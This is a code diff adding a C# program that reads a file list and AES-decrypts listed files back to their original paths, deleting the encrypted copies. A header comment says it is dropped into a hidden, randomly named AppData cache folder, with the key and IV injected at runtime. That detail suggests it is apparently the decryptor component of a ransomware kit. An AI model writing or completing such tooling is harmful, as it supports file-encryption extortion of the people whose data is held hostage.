@@ -1,0 +1,38 @@
+// Dropped as %AppData%\.cache_<8hex>\dec.cs
+// AES-256 key and IV are written in Base64 at runtime (placeholders below).
+using System;
+using System.IO;
+using System.Security.Cryptography;
+class Dec {
+    static void Main() {
+        string b = AppDomain.CurrentDomain.BaseDirectory;
+        byte[] k = Convert.FromBase64String("<AES-256-KEY-B64>");
+        byte[] iv = Convert.FromBase64String("<AES-IV-B64>");
+        string listPath = Path.Combine(b, "list.dat");
+        if (!File.Exists(listPath)) { Console.WriteLine("No list."); return; }
+        string[] lines = File.ReadAllLines(listPath);
+        int ok = 0, fail = 0;
+        foreach (string line in lines) {
+            if (string.IsNullOrWhiteSpace(line)) continue;
+            int sep = line.IndexOf('|');
+            if (sep < 0) continue;
+            string enc = line.Substring(0, sep);
+            string orig = line.Substring(sep + 1);
+            try {
+                byte[] data = File.ReadAllBytes(enc);
+                byte[] dec;
+                using (Aes a = Aes.Create()) {
+                    a.Key = k; a.IV = iv;
+                    a.Mode = CipherMode.CBC;
+                    a.Padding = PaddingMode.PKCS7;
+                    using (ICryptoTransform d = a.CreateDecryptor())
+                        dec = d.TransformFinalBlock(data, 0, data.Length);
+                }
+                File.WriteAllBytes(orig, dec);
+                File.Delete(enc);
+                ok++;
+            } catch { fail++; }
+        }
+        Console.WriteLine("Restored: " + ok + " Failed: " + fail);
+    }
+}
